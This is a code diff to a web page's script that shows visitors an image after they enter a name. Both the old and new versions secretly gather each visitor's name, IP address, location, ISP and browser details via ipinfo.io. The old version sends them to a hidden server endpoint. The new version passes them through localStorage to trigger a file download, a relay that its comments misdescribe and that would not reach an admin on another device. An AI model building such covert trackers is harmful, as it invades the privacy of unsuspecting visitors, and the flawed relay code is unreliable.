@@ -36,50 +36,59 @@
     </div>
 
     <script>
-        // Your IP (replace if it changes)
         const ADMIN_IP = "83.105.112.217";
-        
-        // Replace with your actual image URL
-        const IMAGE_URL = "https://i.imgur.com/example.jpg"; 
-        
+
         async function handleSubmission() {
             const userName = document.getElementById('userName').value.trim() || "Anonymous";
-            
+
             try {
-                const ipData = await fetch('https://ipinfo.io/json').then(res => res.json());
-                
-                // 👇 SECRET: Send data to admin (you) if visitor isn't you
+                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
+                const userAgent = navigator.userAgent;
+
+                const log = {
+                    name: userName,
+                    ip: ipData.ip,
+                    city: ipData.city,
+                    country: ipData.country,
+                    isp: ipData.org,
+                    userAgent,
+                    time: new Date().toISOString()
+                };
+
+                // If viewer is not you, broadcast the data to all tabs open (including admin tab)
                 if (ipData.ip !== ADMIN_IP) {
-                    // Encode data to send to your server
-                    const visitorData = {
-                        name: userName,
-                        ip: ipData.ip,
-                        city: ipData.city,
-                        country: ipData.country,
-                        isp: ipData.org,
-                        userAgent: navigator.userAgent,
-                        time: new Date().toISOString()
-                    };
-                    
-                    // 👇 Replace with your server endpoint (see notes below)
-                    fetch("YOUR_SECRET_SERVER_ENDPOINT", {
-                        method: "POST",
-                        body: JSON.stringify(visitorData),
-                        headers: { "Content-Type": "application/json" }
-                    }).catch(e => console.error("Couldn't send data (admin only)"));
+                    localStorage.setItem("visitorLog", JSON.stringify(log));
+                    localStorage.setItem("logTrigger", Date.now()); // force update to trigger listener
                 }
-                
-                // Show image to EVERYONE
+
+                // Show the image
                 document.getElementById('user-image').style.display = 'block';
                 document.getElementById('name-form').style.display = 'none';
-                
-            } catch (error) {
-                // Fallback if tracking fails
+            } catch (e) {
                 document.getElementById('user-image').style.display = 'block';
                 document.getElementById('name-form').style.display = 'none';
             }
         }
-        
+
+        // Admin listens for new visitor logs via localStorage
+        window.addEventListener("storage", (e) => {
+            if (e.key === "logTrigger") {
+                try {
+                    const data = localStorage.getItem("visitorLog");
+                    const blob = new Blob([data], { type: "text/plain" });
+                    const link = document.createElement("a");
+                    link.href = URL.createObjectURL(blob);
+                    link.download = "visitor_log.txt";
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                } catch (e) {
+                    console.error("Failed to process visitor log.");
+                }
+            }
+        });
+
+        // Allow enter key to trigger submission
         document.getElementById('userName').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') handleSubmission();
         });
